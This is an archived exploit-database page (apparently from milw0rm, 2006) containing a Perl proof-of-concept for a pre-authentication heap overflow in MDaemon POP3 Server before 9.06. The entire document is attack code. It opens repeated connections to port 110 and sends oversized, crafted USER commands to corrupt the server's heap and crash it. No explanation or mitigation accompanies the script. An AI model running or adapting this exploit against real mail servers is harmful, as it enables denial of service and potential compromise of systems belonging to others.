<html><head><title>MDaemon POP3 Server < 9.06 (USER) Remote Buffer Overflow PoC</title></head><pre>#
# PoC for Mdaemon POP3 preauth heap overflow
#
# Coded by Leon Juranic &lt;leon.juranic@infigo.hr&gt;
# Infigo IS &lt;http://www.infigo.hr&gt;
# 
#

$host = '192.168.0.105';

use IO::Socket;

for ($x = 0 ; $x &lt; 12 ; $x++)
{
	$sock = new IO::Socket::INET (PeerAddr =&gt; $host,PeerPort =&gt; '110', Proto =&gt; 'tcp') 
	|| die &quot;socket error\n\n&quot;;
	recv ($sock, $var, 10000,0);
	print $var;
	print $sock &quot;USER &quot; . &quot;\@A&quot; x 160 . &quot;\r\n&quot;;
	recv ($sock, $var, 10000,0);
	print $var;
	print $sock &quot;QUIT\r\n&quot;;
	recv ($sock, $var, 10000,0);
	print $var;
	close ($sock);
	sleep(1);
}
	$sock = new IO::Socket::INET (PeerAddr =&gt; $host,PeerPort =&gt; '110', Proto =&gt; 'tcp') 
	|| die &quot;socket error\n\n&quot;;
	recv ($sock, $var, 10000,0);
	print $var;
	print $sock &quot;USER &quot; . &quot;\@A\@A&quot; . &quot;B&quot; x 326 . &quot;\r\n&quot;;
	recv ($sock, $var, 10000,0);
	print $var;
	print $sock &quot;USER &quot; . &quot;\'A&quot; x  337 . &quot;\r\n&quot;;
	recv ($sock, $var, 10000,0);
	print $var;
	sleep(2);

# milw0rm.com [2006-08-22]</pre></html>